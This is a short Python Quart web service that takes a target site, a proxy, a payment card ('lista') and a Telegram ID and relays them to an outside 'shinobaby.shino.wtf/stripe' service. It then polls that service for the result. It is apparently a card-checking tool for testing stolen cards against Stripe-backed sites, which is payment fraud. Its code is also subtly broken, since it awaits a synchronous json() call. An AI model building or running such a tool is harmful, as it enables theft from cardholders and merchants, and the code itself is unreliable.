from quart import Quart, request, jsonify
import httpx
import asyncio

app = Quart(__name__)

@app.route('/')
async def home():
    return 'OK'

@app.route('/stripe_raw', methods=['GET'])
async def stripe_raw():
    site = request.args.get('site', '')
    proxy = request.args.get('proxy', '')
    card = request.args.get('card', '')
    tgid = request.args.get('tgid', '')

    if not site or not proxy or not card:
        return jsonify({"error": "Missing required parameter."}), 400

    postData = {
        "data": {
            "site": site,
            "lista": card,
            "sec": proxy,
            "tgid": tgid
        },
        "speed_mode": "slow"
    }

    try:
        async with httpx.AsyncClient(timeout=20) as client:
            r = await client.post("https://shinobaby.shino.wtf/stripe", json=postData)
            resp = await r.json()
    except Exception as e:
        return jsonify({"error": "API POST error", "detail": str(e)}), 500

    if resp.get("status") == "processing":
        status_url = "https://shinobaby.shino.wtf" + resp["check_status_url"]
        for i in range(15):
            await asyncio.sleep(5)
            try:
                async with httpx.AsyncClient(timeout=20) as client:
                    poll = await client.get(status_url)
                    result = await poll.json()
            except Exception as e:
                return jsonify({"error": "API polling error", "detail": str(e)}), 500

            if result.get("status") == "completed":
                return jsonify(result)
            elif i == 14:
                return jsonify({"error": "Timed out waiting for result."}), 504
    else:
        return jsonify({"error": "API error", "resp": resp}), 502
